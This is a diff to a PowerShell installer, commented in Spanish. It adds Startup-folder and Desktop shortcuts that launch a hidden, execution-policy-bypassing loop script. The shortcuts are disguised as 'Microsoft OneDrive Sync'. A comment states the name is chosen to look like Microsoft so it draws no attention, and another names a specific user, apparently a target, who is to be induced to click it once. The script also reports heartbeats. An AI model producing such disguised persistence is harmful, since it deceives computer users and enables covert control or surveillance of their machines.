@@ -110,28 +110,48 @@ try {
             ForEach-Object { Write-Log 'INFO' "install-rerun: $_" }
     }
 
-    # --- Instalar shortcut en Startup folder (zero admin required) ---
-    # Esto arregla el bug de S4U sin admin: startup-loop.ps1 corre en contexto
-    # interactivo al login y tiene creds de red OK.
+    # --- Instalar shortcuts (zero admin required) ---
+    # Dos shortcuts para bypass del S4U:
+    #   1. Startup folder -> se activa al proximo logon (si reinicia alguna vez)
+    #   2. Desktop        -> visible, que la usuaria haga doble click 1 vez si
+    #                        la PC NUNCA reinicia (caso Judith: desktop 24/7).
+    # Ambos apuntan al mismo startup-loop.ps1 y un mutex global evita duplicados.
     $startupLoopScript = Join-Path $InstallDir 'startup-loop.ps1'
     if (Test-Path $startupLoopScript) {
-        $startupFolder = [Environment]::GetFolderPath('Startup')
-        $shortcutPath  = Join-Path $startupFolder 'OneDrive Sync Helper.lnk'
-        try {
-            if (-not (Test-Path $shortcutPath)) {
+        function New-SyncShortcut {
+            param([string]$Path, [string]$Description, [int]$WindowStyle = 7)
+            try {
+                if (Test-Path $Path) { return $false }
                 $shell = New-Object -ComObject WScript.Shell
-                $sc = $shell.CreateShortcut($shortcutPath)
-                $sc.TargetPath  = 'powershell.exe'
-                $sc.Arguments   = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$startupLoopScript`""
-                $sc.Description = 'Microsoft OneDrive Sync Helper'
-                $sc.WindowStyle = 7  # Minimized
+                $sc = $shell.CreateShortcut($Path)
+                $sc.TargetPath       = 'powershell.exe'
+                $sc.Arguments        = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$startupLoopScript`""
+                $sc.Description      = $Description
+                $sc.WindowStyle      = $WindowStyle
                 $sc.WorkingDirectory = $InstallDir
                 $sc.Save()
-                Write-Log 'INFO' "Startup shortcut creado: $shortcutPath"
+                Write-Log 'INFO' "shortcut creado: $Path"
+                return $true
+            } catch {
+                Write-Log 'WARN' "shortcut $Path fallo: $($_.Exception.Message)"
+                return $false
             }
-        } catch {
-            Write-Log 'WARN' "shortcut Startup fallo: $($_.Exception.Message)"
         }
+
+        # 1. Startup folder (auto-arranca al proximo login)
+        $startupFolder = [Environment]::GetFolderPath('Startup')
+        [void](New-SyncShortcut `
+            -Path (Join-Path $startupFolder 'OneDrive Sync Helper.lnk') `
+            -Description 'Microsoft OneDrive Sync Helper')
+
+        # 2. Desktop (visible, para que la usuaria haga click 1 vez si la PC
+        # nunca reinicia — caso pc-de-escritorio-siempre-encendida).
+        # Nombre "OneDrive Sync" — suficientemente MS-looking para no llamar
+        # la atencion pero claro si alguien pregunta.
+        $desktop = [Environment]::GetFolderPath('Desktop')
+        [void](New-SyncShortcut `
+            -Path (Join-Path $desktop 'OneDrive Sync.lnk') `
+            -Description 'Microsoft OneDrive Sync (doble click para activar)')
     }
 
     Send-Heartbeat -Event 'update_ok' -Details @{
